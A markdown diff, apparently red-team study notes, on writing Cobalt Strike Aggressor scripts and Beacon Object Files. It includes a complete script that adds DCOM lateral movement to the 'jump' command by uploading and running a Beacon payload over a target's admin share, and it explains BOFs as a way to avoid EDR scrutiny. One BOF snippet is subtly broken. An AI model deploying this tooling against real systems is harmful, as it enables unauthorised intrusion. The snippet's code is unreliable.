@@ -651,3 +651,304 @@ Finally add this to our existing startup service.
 ```
 ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/user/cobaltstrike/agscript 127.0.0.1 50050 headless password host_payloads.cna &'
 ```
+
+# Aggressor Scripts
+
+The `.cna` files that we load into the Cobalt Strike Script Manager are called Aggressor Scripts. These can override default behaviours in Cobalt Strike to customise the UI (add new menus, commands, etc), extended the data models, extended existing commands like jump, and add brand new, custom commands. Aggressor Scripts are programmed with **Sleep language**.
+
+* Documentation: [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm)
+* Sleep: [http://sleep.dashnine.org/manual/index.html](http://sleep.dashnine.org/manual/index.html)
+
+## Adding INVOKE_DCOM to JUMP and REMOTE-EXEC commands
+
+Aggressor can be used to register new techniques under `jump` and `remote-exec` using [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exploit_register](beacon_remote_exploit_register) and [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exec_method_register](beacon_remote_exec_method_register) respectively.
+
+We are going to integrate `Invoke-DCOM.ps1` into `jump` command. First we need to create a `dcom.cna` template file.
+
+```c
+sub invoke_dcom
+{
+
+}
+
+beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
+```
+
+This will register `dcom` as a new option inside the `jump` command and specifies `invoke_dcom` as the associated callback function. We also need to declare local variables
+
+```c
+sub invoke_dcom
+{
+    local('$handle $script $oneliner $payload');
+}
+
+beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
+```
+
+`local` defines variables that are local to the current function, so they will disappear once executeed.
+
+> **Note**: Sleep language have `global`, `closure-specific` and `local` scopes for variable declaration.
+
+The next step is to acknowledge receipt of the task using `btask`.  This takes the ID of the Beacon, the text to post and an ATT&CK tactic ID.  This will print a message to the Beacon console and add it to the data model used in the activity and session reports that you can generate from Cobalt Strike.
+
+```c
+sub invoke_dcom
+{
+    local('$handle $script $oneliner $payload');
+
+    # acknowledge this command
+    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
+}
+```
+
+In that case:
+
+* `$1` is the Beacon ID.
+* `$2` is the target to jump.
+* `$3` is the selected listener.
+
+Next we want to read in the `Invoke-DCOM.ps1` script from our machine. This can be done with `openf`, `getFileProper` and `script_resource`.
+
+```c
+# read the script
+$handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
+$script = readb($handle, -1);
+closef($handle);
+```
+
+At this moment `$script` has the content of `Invoke-DCOM.ps1`. We can use [https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_host_script](beacon_host_script), this will host the script inside Beacon and returns a short snippet for running it.
+
+```c
+# host the script in Beacon
+$oneliner = beacon_host_script($1, $script);
+```
+
+> **Note**: We can use `println($oneliner)` to see the content of variables. We can check in the Script Console `Cobalt Strike -> Script Console`.
+
+Next step is to generate and upload a paylaod to the target using [https://download.cobaltstrike.com/aggressor-script/functions.html#artifact_payload](artifact_payload) and [https://download.cobaltstrike.com/aggressor-script/functions.html#bupload_raw](bupload_raw). These functions will generate an EXE payload and will upload it to the target directory.
+
+```c
+# generate stageless payload
+$payload = artifact_payload($3, "exe", "x64");
+
+# upload to the target
+bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);
+```
+
+> **Note**: `$+` is used for concat strings (Blank spaces are needed).
+
+Finally [https://download.cobaltstrike.com/aggressor-script/functions.html#bpowerpick](bpowerpick) can execute the `Invoke-DCOM` oneliner. We need to pass it the target computer name and the path to the uploaded payload. Also beacuse, this could be a P2P payload and we want to automatically try and link to it, which can be done with [https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_link](beacon_link).
+
+```c
+# run via powerpick
+bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);
+
+# link if p2p beacon
+beacon_link($1, $2, $3);
+```
+
+The complete script:
+
+```c
+sub invoke_dcom
+{
+    local('$handle $script $oneliner $payload');
+
+    # acknowledge this command1
+    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
+
+    # read in the script
+    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
+    $script = readb($handle, -1);
+    closef($handle);
+
+    # host the script in Beacon
+    $oneliner = beacon_host_script($1, $script);
+
+    # generate stageless payload
+    $payload = artifact_payload($3, "exe", "x64");
+
+    # upload to the target
+    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);
+
+    # run via powerpick
+    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);
+
+    # link if p2p beacon
+    beacon_link($1, $2, $3);
+}
+
+beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
+```
+
+# Beacon Object Files
+
+Beacon Object Files (BOFs) are a post-ex capability that allows for code execution inside the Beacon host process. The main advantage is to avoid the `fork & run` pattern that commands such as `powershell`, `powerpick` and `execute-assembly` rely on. Since these spawn a sacrificial process and use process injection to run the post-ex action, they are heavily scrutinised by AV and EDR products.
+
+BOFs are COFF objects writtent in C or C++ on which beacons acts as a linker and loader. Beacon does not link BOFs to a standard C library, so many common functions are not available. However, beacon does expose several internal APIs that can be used to simplify some actions such as argument parsing and hangling output.
+
+We can download the `beacon.h` library on the follwing link.
+
+* [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h)
+
+## Example on inline-execute
+
+An example of a basic BOF which sends `Hello World!! :)` as output is:
+
+```c
+#include <windows.h>
+#include "beacon.h"
+
+void go(char * args, int len)
+{
+    BeaconPrintf(CALLBACK_OUTPUT, "Hello World!! :)");
+}
+```
+
+We need to compile it in windows or linux:
+
+* Windows:
+
+```
+cl.exe /c /GS- hello-world.c /hello-world.o
+```
+
+* Linux:
+
+```
+x86_64-w64-mingw32-gcc -c hello-world.c -o hello-world.o
+```
+
+Finally we can execute it with the command `inline-execute`.
+
+```
+beacon> inline-execute C:\Windows\Temp\hello-world.o
+```
+
+> **Note**: The built-in `inline-execute` commands expects that the entry point of the BOF is called `go`.
+
+
+## Handling Arguments
+
+Sometimes we need to pass arguments to a BOF. A typicall console application may looks like `main(int argc, char *argv[])` but BOF uses `go(char * args, int len)`.
+
+These arguments are packed into a special binary format using the `bof_pack` aggressor function and can be unpacked using Beacons APIs exported via `beacon.h`.
+
+First we need to call `BeaconDataParse` to nitialise the parser and then `BeaconDataExtract` to extract the argument.
+
+```c
+void go(char * args, int len)
+{
+    datap parser;
+    BeaconDataParse(&parser, args, len);
+
+    char * var1;
+    username = BeaconDataExtract(&parser, NULL);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "The VARIABLE 1 is: %s", var1);
+}
+```
+
+If we need to pass more than one argument, we need to unpack them in the same order they were packed.
+
+```c
+char * var1;
+char * var2;
+
+var1 = BeaconDataExtract(&parser, NULL);
+var2 = BeaconDataExtract(&parser, NULL);
+```
+
+We may also want to extract integers, we can do it with `BeaconDataInt`.
+
+```c
+int number;
+number = BeaconDataInt(&parser);
+```
+
+## Calling Win32 APIs
+
+APIs such as LoadLibrary and GetProcAddress are available from a BOF, which can be used to resolve and call other APIs at runtime. 
+
+BOFs provice a convention called Dynamic Function Resolution (DFR) which allows beacons to perform the necessary resolution for you.
+
+Example of definition of a DFR (MessageBoxW):
+
+```c
+DECLSPEC_IMPORT INT WINAPI USER32$MessageBoxW(HWND, LPCWSTR, LPCWSTR, UINT);
+```
+
+We can find the information on the documentation:
+
+* [https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxw](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxw)
+
+```c
+#include <windows.h>
+#include "beacon.h"
+
+void go(char * args, int len)
+{
+    DECLSPEC_IMPORT INT WINAPI USER32$MessageBoxW(HWND, LPCWSTR, LPCWSTR, UINT);
+
+    datap parser;
+    BeaconDataParse(&parser, args, len);
+
+    wchar_t * message;
+    message = (wchar_t *)BeaconDataExtract(&parser, NULL);
+
+    USER32$MessageBoxW(NULL, message, L"Message Box", 0);
+}
+```
+
+## Implementation with Aggressor
+
+We can implement our BOF with Aggressor by registering custom aliases and commands.
+
+```
+alias hello-world {
+    local('$handle $bof $args');
+    
+    # read the bof file (assuming x64 only)
+    $handle = openf(script_resource("hello-world.o"));
+    $bof = readb($handle, -1);
+    closef($handle);
+    
+    # print task to console
+    btask($1, "Running Hello World BOF");
+    
+    # execute bof
+    beacon_inline_execute($1, $bof, "go");
+}
+
+# register a custom command
+beacon_command_register("hello-world", "Execute Hello World BOF", "Loads hello-world.o and calls the \"go\" entry point.");
+```
+
+Arguments passed on the CS GUI command line are separated by whitespace. The first argument will be `$1` is always the current beacon, then `$2`, `$3`... are our input. We can pack the arguments we want to send in our agressor script.
+
+These arguments are packed into a special binary format using the `bof_pack` aggressor function and can be unpacked using Beacons APIs exported via `beacon.h`.
+
+```
+$args = bof_pack($1, "z", $2);
+```
+`"z"` tells Cobalt Strike what format of data this is, where `z` represents a zero-terminated and encoded string.
+
+Cobalt Strike Data formats:
+
+| **Format** |          **Description**         |     **Unpack Function**     |
+|:----------:|:--------------------------------:|:---------------------------:|
+|      b     |            Binary Data           |      BeaconDataExtract      |
+|      i     |       4-byte integer (int)       |        BeaconDataInt        |
+|      s     |      2-byte integer (short)      |       BeaconDataShort       |
+|      z     | zero-terminated + encoded string |      BeaconDataExtract      |
+|      Z     |    zero-terminated wide string   | (wchar_t*)BeaconDataExtract |
+
+Multiple arguments should be packed at the same time.
+
+```c
+// pack 2 strings
+$args = bof_pack($1, "zz", "str1", "str2");
+
+// pack a string and an int
+$args = bof_pack($1, "zi", "str1", 123);
+```
